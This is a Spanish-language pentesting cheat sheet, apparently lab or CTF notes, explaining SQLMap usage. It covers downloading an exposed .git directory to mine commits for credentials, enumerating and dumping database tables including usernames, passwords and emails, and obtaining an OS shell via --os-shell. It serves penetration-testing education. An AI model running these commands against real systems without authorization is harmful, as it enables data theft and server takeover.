# SQL-Map 

Tags: #Tool #Web #Enumeracion #BurpSuite #SQLI #Git

**SQLMap** es una herramienta de pruebas de penetración de código abierto que se utiliza para detectar y explotar vulnerabilidades de inyección SQL en aplicaciones web. Esta herramienta se basa en un motor de inyección SQL altamente automatizado que puede detectar y explotar una amplia variedad de vulnerabilidades de inyección SQL en diferentes sistemas de gestión de bases de datos.

SQLMap se utiliza para probar la seguridad de aplicaciones web que utilizan bases de datos, identificando y aprovechando vulnerabilidades de inyección SQL. Para hacer esto, SQLMap realiza una exploración automatizada de la aplicación web, identifica las vulnerabilidades de inyección SQL y explota estas vulnerabilidades para extraer información de la base de datos. La información extraída puede incluir nombres de usuario, contraseñas y otra información confidencial que podría ser utilizada por un atacante malintencionado para comprometer la seguridad de la aplicación.

Al utilizar SQLMap, los profesionales de seguridad pueden identificar y corregir las vulnerabilidades de inyección SQL en sus aplicaciones web, lo que mejora significativamente la seguridad de estas aplicaciones. También pueden utilizar SQLMap para realizar pruebas de penetración en aplicaciones web de terceros y así evaluar su nivel de seguridad. En general, SQLMap es una herramienta valiosa para cualquier profesional de la seguridad que trabaja en pruebas de penetración de aplicaciones web y en la detección de vulnerabilidades de inyección SQL.

## SQLMap

Cuando mires en una maquina victima el directorio **/.git/** quiere decir que es porque se ha clonado un directorio Git y eso puede suponer un riesgo porque si tiene capacidad de 'directory listing'  nos podemos traer los archivos a la maquina de atacante. 
```bash 
❯ wget -r http://192.168.68.11           # Nos descargarnos de forma recursiva el contenido del dir .git
❯ git log                                # Pueder ves los 'commits' y su descripcion de cada cambio 
❯ git show <id>                          # puedes ver el contenido de los commit y en algunos casos obtener el registro de credenciales 
```

```bash 
❯ sqlmap -u 'http://<IP Victima>' --dbs --cookie "PHPSESSID=8w7uf5n4yn4q7896578yb" --dbms mysql --batch  # Debemos de colocar la url hasta el parametro que se usa para modificar e inyectar el SQL.
	# dbs = Haremos que nos enumere las bases de datos, pero antes debemos de estar autenticados 
	# cookie = "usuario=valor" Colocar la Cookie de Sesion de la web que se encuentra en (Inspector > Storage > Value)
	# dbms = Para indicarle que la base de datos es Mysql y asi evitar algunas preguntas (Esto si conocemos que base de datos esta corriendo) 
	# batch = Indicar que no queremos que nos este preguntando y solo nos muestre los resultados obtenidos

❯ sqlmap -u 'http://<IP Victima>' --cookie "PHPSESSID=8w7uf5n4yn4q7896578yb" --dbms mysql --batch -D <DB-name> --tables
	# D = Colocar el nombre de la DB que hemos encontrado 
	# tables = Enumerar las tablas de la DB

❯ sqlmap -u 'http://<IP Victima>' --cookie "PHPSESSID=8w7uf5n4yn4q7896578yb" --dbms mysql --batch -D <DB-name> -T <Table-name> --columns
	# columns = Enumerar las columnas 
	# T = Nombre de la tabla 

❯ sqlmap -u 'http://<IP Victima>' --cookie "PHPSESSID=8w7uf5n4yn4q7896578yb" --dbms mysql --batch -D <DB-name> -T <Table-name> -C <username,password,email> --dump
	# C = Colocas las columnas que quieres dumpear
	# dump = Mostrar el contenido de las columnas username, password y email

❯ sqlmap -u 'http://<IP Victima>' --cookie "PHPSESSID=8w7uf5n4yn4q7896578yb" --dbms mysql --risk 3 --level 4   # Esto demora mas tiempo 
	# risk = Nivel de riesgo 
	# level = Nivel de profundidad

❯ sqlmap -u 'http://<IP Victima>' --cookie "PHPSESSID=8w7uf5n4yn4q7896578yb" --os-shell --batch     # Si el servidor interpreta PHP, tenemos permisos, podriamos ganar una consola interactiva 
```

Podemos usar los archivos de BurpSuite para ingresarlos en la herramienta SQLMap y así nos diga que tipo de vulnerabilidades tiene, además de poder obtener datos a partir de ellas. Para este ejemplo usaremos **SQLI**

```bash
❯ sqlmap -r example.req -p searchitem --batch

	# r = Archivo con el contenido del Proxy de BurpSuite .req
	# p = El campo donde queremos que pruebe 
	# batch = Para que no nos muestre las preguntas y las salte
```

```bash
❯ sqlmap -r example.req -p searchitem --batch --dbs

	# r = File con el contenido del Proxy de BurpSuite .req
	# p = El campo donde queremos que pruebe 
	# batch = Para que no nos muestre las preguntas y las salte
	# dbs = Me muestre todas las bases de datos existentes (Dumpear)
```

Una vez obtenidas las DBs podemos apuntar a las **tablas** de una base especifica

```bash
❯ sqlmap -r example.req -p searchitem --batch -D sqltraining --tables

	# r = File con el contenido del Proxy de BurpSuite .req
	# p = El campo donde queremos que pruebe 
	# batch = Para que no nos muestre las preguntas y las salte
	# D = Le colocamos el nombre de la DB existente 
	# tables = Queremos que nos muestre las tablas de la DB que elegimos 
```

Una vez obtenidas las tablas, ahora vamos a querer que nos enumere las **columnas**

```bash
❯ sqlmap -r example.req -p searchitem --batch -D sqltraining -T users --columns

	# r = File con el contenido del Proxy de BurpSuite .req
	# p = El campo donde queremos que pruebe 
	# batch = Para que no nos muestre las preguntas y las salte
	# D = Le colocamos el nombre de la DB existente 
	# T = Le colocamos el nombre de la tabla existente 
	# columns = Queremos que nos muestre las columnas de la DB que elegimos 
```

Una vez obtenidas las columnas podemos hacer que nos **muestre (Dumpear)** sus valores

```bash
❯ sqlmap -r example.req -p searchitem --batch -D sqltraining -T users -C username,password --dump

	# r = File con el contenido del Proxy de BurpSuite .req
	# p = El campo donde queremos que pruebe 
	# batch = Para que no nos muestre las preguntas y las salte
	# D = Le colocamos el nombre de la DB existente 
	# T = Le colocamos el nombre de la tabla existente 
	# C = Le colocamos el nombre de las columnas existente 
	# dump = Que nos muestre los valores que tienen esas columnas
```



